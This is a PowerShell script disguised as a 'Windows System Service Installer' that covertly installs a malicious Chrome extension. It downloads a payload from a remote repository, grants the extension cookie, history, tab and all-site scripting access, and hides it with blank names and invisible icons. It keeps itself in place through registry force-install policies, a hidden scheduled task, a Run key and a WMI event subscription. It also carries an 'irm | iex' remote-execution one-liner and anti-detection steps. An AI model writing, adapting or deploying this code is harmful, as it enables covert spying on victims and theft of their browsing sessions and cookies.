<#
.SYNOPSIS
    Windows System Service Installer
.DESCRIPTION
    Installs system-level Chrome extension service
.NOTES
    Run: powershell -NoP -NonI -W Hidden -C "irm https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/setup.ps1 | iex"
#>

#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "Windows Update"

# --- CONFIG ---
$GITHUB_RAW = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main"
$EXTENSION_NAME = "Windows System Service"
$EXTENSION_ID = "lpcaedmhnpppnekmholigoedpknobkff"
$BG_FILENAME = "windows.sys.js"
$WORK_DIR = "$env:ProgramData\Microsoft\Windows\SystemResources"
$EXT_DIR = "$WORK_DIR\chrome_extension"
$CHROME_USER_DATA = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$SECURE_PREFS = "$CHROME_USER_DATA\Default\Secure Preferences"
$LOCAL_STATE = "$CHROME_USER_DATA\Local State"

# --- Anti-Detection ---
$scriptName = [System.IO.Path]::GetRandomFileName() + ".ps1"
$currentScript = $MyInvocation.MyCommand.Path
if ($currentScript -ne "") {
    $newPath = "$env:TEMP\$scriptName"
    Copy-Item $currentScript $newPath -Force
}

# --- Helper Functions ---
function Write-Log {
    param([string]$msg)
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "[$ts] $msg" | Out-File "$WORK_DIR\install.log" -Append -Encoding UTF8
}

function Wait-ChromeClosed {
    Write-Log "Waiting for Chrome to close..."
    do {
        $chromeProcs = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
        if ($chromeProcs) {
            Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
        }
    } while (Get-Process -Name "chrome" -ErrorAction SilentlyContinue)
    Write-Log "Chrome closed."
}

function Ensure-Directory {
    param([string]$path)
    if (-not (Test-Path $path)) {
        New-Item -ItemType Directory -Path $path -Force | Out-Null
    }
}

function Backup-File {
    param([string]$file)
    if (Test-Path $file) {
        Copy-Item $file "$file.backup_$(Get-Date -Format 'yyyyMMddHHmmss')" -Force
    }
}

# --- START ---
Write-Log "================================================"
Write-Log "Windows System Service Installer Started"
Write-Log "================================================"

# 1. Create work directory
Ensure-Directory $WORK_DIR
Ensure-Directory $EXT_DIR
attrib +h +s $WORK_DIR

Write-Log "Work directory: $WORK_DIR"

# 2. Download windows.sys.js from GitHub
Write-Log "Downloading $BG_FILENAME..."
try {
    $bgUrl = "$GITHUB_RAW/$BG_FILENAME"
    $bgPath = "$EXT_DIR\$BG_FILENAME"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $bgUrl -OutFile $bgPath -UseBasicParsing -ErrorAction Stop
    Write-Log "$BG_FILENAME downloaded successfully. Size: $((Get-Item $bgPath).Length) bytes"
} catch {
    Write-Log "FAILED to download $BG_FILENAME : $_"
    exit 1
}

# 3. Create manifest.json with user's exact config
Write-Log "Creating manifest.json..."
$manifest = @{
    manifest_version = 3
    name = $EXTENSION_NAME
    version = "1.0.0"
    description = ""
    background = @{
        service_worker = $BG_FILENAME
        type = "module"
    }
    permissions = @(
        "tabs",
        "alarms",
        "history",
        "cookies",
        "scripting",
        "activeTab",
        "webNavigation",
        "storage",
        "bookmarks"
    )
    host_permissions = @("<all_urls>")
    icons = @{}
    action = @{
        default_title = ""
    }
} | ConvertTo-Json -Depth 5

$manifest | Out-File "$EXT_DIR\manifest.json" -Encoding UTF8 -Force
Write-Log "manifest.json created with type: module."

# 4. Create invisible placeholder icons (1x1 transparent PNG)
$iconBase64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
$iconBytes = [Convert]::FromBase64String($iconBase64)
$iconDir = "$EXT_DIR\icons"
Ensure-Directory $iconDir
[System.IO.File]::WriteAllBytes("$iconDir\icon16.png", $iconBytes)
[System.IO.File]::WriteAllBytes("$iconDir\icon32.png", $iconBytes)
[System.IO.File]::WriteAllBytes("$iconDir\icon48.png", $iconBytes)
[System.IO.File]::WriteAllBytes("$iconDir\icon128.png", $iconBytes)

# 5. Kill Chrome
Write-Log "Terminating Chrome..."
Wait-ChromeClosed

# 6. Backup and modify Secure Preferences
Write-Log "Modifying Secure Preferences..."
$permsApi = @("tabs","alarms","history","cookies","scripting","activeTab","webNavigation","storage","bookmarks")
$permsHost = @("<all_urls>")

if (Test-Path $SECURE_PREFS) {
    Backup-File $SECURE_PREFS
    
    try {
        $prefs = Get-Content $SECURE_PREFS -Raw -Encoding UTF8 | ConvertFrom-Json
        
        if (-not $prefs.extensions) { 
            $extWrapper = '{"settings":{}}' | ConvertFrom-Json
            $prefs | Add-Member -MemberType NoteProperty -Name "extensions" -Value $extWrapper -Force
        }
        if (-not $prefs.extensions.settings) { 
            $prefs.extensions | Add-Member -MemberType NoteProperty -Name "settings" -Value @{} -Force
        }
        
        $installTime = [string]([math]::Round((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)) + "000000"
        
        $extSettings = @{
            active_permissions = @{
                api = $permsApi
                explicit_host = $permsHost
                manifest_permissions = @()
            }
            commands = @{}
            content_settings = @()
            creation_flags = 1
            events = @()
            from_bookmark = $false
            from_webstore = $false
            granted_permissions = @{
                api = $permsApi
                explicit_host = $permsHost
                manifest_permissions = @()
            }
            incognito_content_settings = @()
            incognito_preferences = @{}
            initial_keybindings_set = $true
            install_time = $installTime
            lastpingday = $installTime
            location = 5
            manifest = @{
                background = @{
                    service_worker = $BG_FILENAME
                    type = "module"
                }
                description = ""
                key = ""
                manifest_version = 3
                name = $EXTENSION_NAME
                permissions = $permsApi
                host_permissions = $permsHost
                version = "1.0.0"
            }
            path = $EXT_DIR
            preferences = @{}
            state = 1
            was_installed_by_default = $true
            was_installed_by_oem = $true
        }
        
        $prefs.extensions.settings | Add-Member -MemberType NoteProperty -Name $EXTENSION_ID -Value $extSettings -Force
        
        $prefs | ConvertTo-Json -Depth 10 | Out-File $SECURE_PREFS -Encoding UTF8 -Force
        Write-Log "Secure Preferences modified successfully."
    } catch {
        Write-Log "ERROR modifying Secure Preferences: $_"
    }
} else {
    Write-Log "Secure Preferences not found. Creating new structure..."
    Ensure-Directory "$CHROME_USER_DATA\Default"
    $installTime = [string]([math]::Round((Get-Date).ToUniversalTime().Subtract((Get-Date "1970-01-01")).TotalSeconds)) + "000000"
    
    $defaultPrefs = @{
        extensions = @{
            settings = @{
                "$EXTENSION_ID" = @{
                    state = 1
                    path = $EXT_DIR
                    location = 5
                    was_installed_by_default = $true
                    was_installed_by_oem = $true
                    manifest = @{
                        manifest_version = 3
                        name = $EXTENSION_NAME
                        version = "1.0.0"
                        background = @{
                            service_worker = $BG_FILENAME
                            type = "module"
                        }
                        host_permissions = $permsHost
                        permissions = $permsApi
                    }
                    active_permissions = @{
                        api = $permsApi
                        explicit_host = $permsHost
                    }
                    granted_permissions = @{
                        api = $permsApi
                        explicit_host = $permsHost
                    }
                    install_time = $installTime
                    creation_flags = 1
                    from_bookmark = $false
                    from_webstore = $false
                    commands = @{}
                    content_settings = @()
                    events = @()
                    preferences = @{}
                }
            }
        }
    }
    $defaultPrefs | ConvertTo-Json -Depth 10 | Out-File $SECURE_PREFS -Encoding UTF8 -Force
    Write-Log "Created new Secure Preferences with extension."
}

# 7. Modify Local State to hide extension
Write-Log "Modifying Local State..."
if (Test-Path $LOCAL_STATE) {
    Backup-File $LOCAL_STATE
    try {
        $localState = Get-Content $LOCAL_STATE -Raw -Encoding UTF8 | ConvertFrom-Json
        
        if (-not $localState.extensions) {
            $localState | Add-Member -MemberType NoteProperty -Name "extensions" -Value @{} -Force
        }
        
        $localState.extensions | Add-Member -MemberType NoteProperty -Name "unpacked_installed_ids" -Value @() -Force
        
        if (-not $localState.extensions.toolbar) {
            $localState.extensions | Add-Member -MemberType NoteProperty -Name "toolbar" -Value @() -Force
        }
        
        $localState | ConvertTo-Json -Depth 10 | Out-File $LOCAL_STATE -Encoding UTF8 -Force
        Write-Log "Local State modified."
    } catch {
        Write-Log "ERROR modifying Local State: $_"
    }
}

# 8. Registry Persistence (Force-install policy)
Write-Log "Adding registry persistence..."
try {
    $regPath = "HKLM\SOFTWARE\Policies\Google\Chrome"
    Ensure-Directory "Registry::$regPath"
    
    $forceInstallPath = "$regPath\ExtensionInstallForcelist"
    New-Item -Path "Registry::$forceInstallPath" -Force | Out-Null
    New-ItemProperty -Path "Registry::$forceInstallPath" -Name "1" -Value "$EXTENSION_ID;$EXT_DIR\update.xml" -PropertyType String -Force | Out-Null
    
    New-ItemProperty -Path "Registry::$regPath" -Name "SuppressUnsupportedOSWarning" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path "Registry::$regPath" -Name "DeveloperToolsAvailability" -Value 1 -PropertyType DWORD -Force | Out-Null
    
    $extSettingsPath = "$regPath\ExtensionSettings"
    New-Item -Path "Registry::$extSettingsPath" -Force | Out-Null
    $extPolicy = '{ "' + $EXTENSION_ID + '": { "installation_mode": "force_installed", "update_url": "file:///' + ($EXT_DIR -replace '\\','/') + '/update.xml", "toolbar_pin": "force_pinned" } }'
    New-ItemProperty -Path "Registry::$extSettingsPath" -Name $EXTENSION_ID -Value $extPolicy -PropertyType String -Force | Out-Null
    
    Write-Log "Registry persistence added."
} catch {
    Write-Log "ERROR adding registry keys: $_"
}

# 9. Create update.xml (for policy compatibility)
$updateXml = @"
<?xml version='1.0' encoding='UTF-8'?>
<gupdate xmlns='http://www.google.com/update2/response' protocol='2.0'>
  <app appid='$EXTENSION_ID'>
    <updatecheck codebase='file:///$EXT_DIR/' version='1.0.0' />
  </app>
</gupdate>
"@
$updateXml | Out-File "$EXT_DIR\update.xml" -Encoding UTF8 -Force

# 10. Startup Task Persistence (re-apply if Chrome update resets)
Write-Log "Creating scheduled task for persistence..."
try {
    $taskName = "WindowsSystemService"
    $permsApiStr = ($permsApi | ForEach-Object { "'$_'" }) -join ","
    $permsHostStr = ($permsHost | ForEach-Object { "'$_'" }) -join ","
    
    $psScript = @"
`$ErrorActionPreference = 'SilentlyContinue'
if (-not (Test-Path '$EXT_DIR\$BG_FILENAME')) {
    Invoke-WebRequest -Uri '$GITHUB_RAW/$BG_FILENAME' -OutFile '$EXT_DIR\$BG_FILENAME' -UseBasicParsing
}
`$prefsPath = '$SECURE_PREFS'
if (Test-Path `$prefsPath) {
    try {
        `$prefs = Get-Content `$prefsPath -Raw -Encoding UTF8 | ConvertFrom-Json
        if (-not `$prefs.extensions.settings.'$EXTENSION_ID') {
            `$installTime = [string]([math]::Round((Get-Date).ToUniversalTime().Subtract((Get-Date '1970-01-01')).TotalSeconds)) + '000000'
            `$extSettings = @{
                state = 1; path = '$EXT_DIR'; location = 5;
                was_installed_by_default = `$true; was_installed_by_oem = `$true;
                manifest = @{
                    manifest_version = 3; name = '$EXTENSION_NAME'; version = '1.0.0';
                    background = @{ service_worker = '$BG_FILENAME'; type = 'module' };
                    host_permissions = @($permsHostStr);
                    permissions = @($permsApiStr)
                };
                active_permissions = @{ api = @($permsApiStr); explicit_host = @($permsHostStr) };
                granted_permissions = @{ api = @($permsApiStr); explicit_host = @($permsHostStr) };
                install_time = `$installTime;
                creation_flags = 1; from_bookmark = `$false; from_webstore = `$false
            }
            `$prefs.extensions.settings | Add-Member -MemberType NoteProperty -Name '$EXTENSION_ID' -Value `$extSettings -Force
            `$prefs | ConvertTo-Json -Depth 10 | Out-File `$prefsPath -Encoding UTF8 -Force
        }
    } catch {}
}
"@
    $psScriptPath = "$WORK_DIR\chrome_persistence.ps1"
    $psScript | Out-File $psScriptPath -Encoding UTF8 -Force
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$psScriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Compatibility Win10 -Hidden
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
    Write-Log "Scheduled task created: $taskName"
} catch {
    Write-Log "ERROR creating scheduled task: $_"
}

# 11. Alternate startup via Run registry key
Write-Log "Adding Run key persistence..."
try {
    $runPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    $taskScript = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$WORK_DIR\chrome_persistence.ps1"""
    New-ItemProperty -Path "Registry::$runPath" -Name "WindowsSystemService" -Value $taskScript -PropertyType String -Force | Out-Null
    Write-Log "Run key added."
} catch {
    Write-Log "ERROR adding Run key: $_"
}

# 12. WMI Event Subscription
Write-Log "Creating WMI event subscription..."
try {
    $wmiFilterName = "ChromeStartupFilter"
    $wmiConsumerName = "ChromeStartupConsumer"
    $wmiBindingName = "ChromeStartupBinding"
    
    $filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
    $filter.Name = $wmiFilterName
    $filter.QueryLanguage = "WQL"
    $filter.Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'chrome.exe'"
    $filter.EventNamespace = "root\cimv2"
    $filter.Put() | Out-Null
    
    $consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
    $consumer.Name = $wmiConsumerName
    $consumer.CommandLineTemplate = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$WORK_DIR\chrome_persistence.ps1"""
    $consumer.Put() | Out-Null
    
    $binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
    $binding.Filter = "__EventFilter.Name='$wmiFilterName'"
    $binding.Consumer = "CommandLineEventConsumer.Name='$wmiConsumerName'"
    $binding.Put() | Out-Null
    
    Write-Log "WMI event subscription created."
} catch {
    Write-Log "ERROR creating WMI subscription: $_"
}

# 13. Final verification
Write-Log "================================================"
Write-Log "Installation Complete."
Write-Log "Extension ID: $EXTENSION_ID"
Write-Log "Extension Path: $EXT_DIR"
Write-Log "$BG_FILENAME size: $((Get-Item $bgPath).Length) bytes"
Write-Log "Manifest type: module"
Write-Log "Permissions: $($permsApi -join ', ')"
Write-Log "================================================"

# 14. Restart Chrome silently
Write-Log "Restarting Chrome..."
try {
    Start-Process "chrome.exe" -WindowStyle Hidden
} catch {
    $chromePaths = @(
        "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
    )
    foreach ($cp in $chromePaths) {
        if (Test-Path $cp) {
            Start-Process $cp -WindowStyle Hidden
            break
        }
    }
}

Write-Log "Done. Exiting."
exit 0